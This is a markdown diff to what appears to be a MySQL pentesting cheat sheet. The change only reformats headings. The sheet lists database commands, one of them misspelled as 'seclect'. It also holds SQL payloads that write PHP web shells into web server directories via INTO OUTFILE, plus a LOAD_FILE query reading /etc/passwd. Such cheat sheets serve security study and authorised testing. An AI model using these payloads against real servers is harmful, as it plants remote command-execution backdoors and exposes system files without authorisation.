@@ -1,30 +1,29 @@
 
-View Databases:
+### View Databases
 
 ```bash
 show databases;
 ```
 
-Use Database:
+### Use Database
 
 ```bash
 use <database>;
 ```
 
-View Tables:
-
+### View Tables
 
 ```bash
 show tables;
 ```
 
-View Contents of Table:
+### View Contents of Table
 
 ```bash
 seclect * from <table_name>;
 ```
 
-Write file to system
+### Write file to system
 
 ```bash
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
@@ -32,7 +31,7 @@ SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshe
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\cmd.php";
 ```
 
-Read file on system
+### Read file on system
 
 ```bash
 SELECT LOAD_FILE("/etc/passwd");
